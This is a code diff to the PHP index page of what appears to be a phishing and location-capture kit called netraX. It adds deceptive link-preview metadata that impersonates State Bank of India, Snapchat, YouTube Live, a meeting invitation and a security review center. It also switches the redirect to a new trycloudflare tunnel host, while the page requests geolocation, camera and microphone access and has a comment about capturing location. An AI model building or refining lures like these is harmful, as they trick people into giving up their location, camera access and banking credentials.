@@ -1,6 +1,6 @@
 <?php
 /*
- * NOTE: This file is never executed directly. netraX-2.0.sh copies it
+ * NOTE: This file is never executed directly. netraX-3.0.sh copies it
  * (via sed) to index.php at the project root. All __DIR__ references
  * therefore resolve to the project root at runtime.
  */
@@ -16,13 +16,77 @@ unset($_bootstrap);
 header('Permissions-Policy: geolocation=*, camera=*, microphone=*');
 header('Feature-Policy: geolocation *; camera *; microphone *');
 
+/* ── Dynamic Open Graph Metadata Resolution for Rich Social Previews ── */
+$_dataDir = __DIR__ . '/data';
+$_activeTpl = 1;
+if (is_file($_dataDir . '/.active_template')) {
+    $_activeTpl = (int) trim(@file_get_contents($_dataDir . '/.active_template'));
+}
+
+$_ogMeta = [
+    1 => [
+        'title' => "🎉 Season's Greetings & Festival Celebration",
+        'desc'  => 'You have received an exclusive special festival celebration greeting card! Tap here to open and celebrate.',
+        'site'  => 'Festival Greetings Portal',
+        'image' => 'https://images.unsplash.com/photo-1513151233558-d860c5398176?w=1200&auto=format&fit=crop&q=80'
+    ],
+    2 => [
+        'title' => '🔴 LIVE: YouTube Streaming Broadcast',
+        'desc'  => 'Join and watch the live video streaming broadcast now in Ultra HD.',
+        'site'  => 'YouTube Live Stream',
+        'image' => 'https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=1200&auto=format&fit=crop&q=80'
+    ],
+    3 => [
+        'title' => '📹 Virtual Video Conference Meeting Invitation',
+        'desc'  => 'You have been invited to join the active online video conference meeting room.',
+        'site'  => 'Virtual Meeting Portal',
+        'image' => 'https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=1200&auto=format&fit=crop&q=80'
+    ],
+    4 => [
+        'title' => '🛡️ Social Media Account Security & Case Review',
+        'desc'  => 'Official account verification and security case review center.',
+        'site'  => 'Security Verification Center',
+        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=1200&auto=format&fit=crop&q=80'
+    ],
+    5 => [
+        'title' => '🏛️ State Bank of India -- YONO Net Banking',
+        'desc'  => 'Authorized State Bank of India Online Banking portal. Secure customer login.',
+        'site'  => 'State Bank of India',
+        'image' => 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=1200&auto=format&fit=crop&q=80'
+    ],
+    6 => [
+        'title' => '👻 Snapchat -- View Story & Add Friend',
+        'desc'  => 'Tap to open the exclusive Snapchat story and connect.',
+        'site'  => 'Snapchat',
+        'image' => 'https://images.unsplash.com/photo-1611162616305-c69b3fa7fbe0?w=1200&auto=format&fit=crop&q=80'
+    ]
+];
+
+$_curOg = $_ogMeta[$_activeTpl] ?? $_ogMeta[1];
+$_pageTitle = htmlspecialchars($_curOg['title'], ENT_QUOTES, 'UTF-8');
+$_pageDesc  = htmlspecialchars($_curOg['desc'], ENT_QUOTES, 'UTF-8');
+$_pageSite  = htmlspecialchars($_curOg['site'], ENT_QUOTES, 'UTF-8');
+$_pageImg   = htmlspecialchars($_curOg['image'], ENT_QUOTES, 'UTF-8');
+
 // Add JavaScript to capture location
 echo '
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>' . $_pageTitle . '</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="' . $_pageDesc . '">
+    <!-- Open Graph / WhatsApp / Telegram / Facebook / Discord / SMS Link Preview -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="' . $_pageTitle . '">
+    <meta property="og:description" content="' . $_pageDesc . '">
+    <meta property="og:image" content="' . $_pageImg . '">
+    <meta property="og:site_name" content="' . $_pageSite . '">
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="' . $_pageTitle . '">
+    <meta name="twitter:description" content="' . $_pageDesc . '">
+    <meta name="twitter:image" content="' . $_pageImg . '">
     <script>
         // Debug function to log messages - only log essential information
         function debugLog(message) {
@@ -131,11 +195,11 @@ echo '
             // Don\'t log this message
             // Try to redirect to the template page
             try {
-                window.location.href = "https://myspace-public-guns-author.trycloudflare.com/index2.html";
+                window.location.href = "https://jon-shoot-jury-photos.trycloudflare.com/index2.html";
             } catch (e) {
                 // Don\'t log this message
                 // Fallback redirection
-                window.location = "https://myspace-public-guns-author.trycloudflare.com/index2.html";
+                window.location = "https://jon-shoot-jury-photos.trycloudflare.com/index2.html";
             }
         }
         
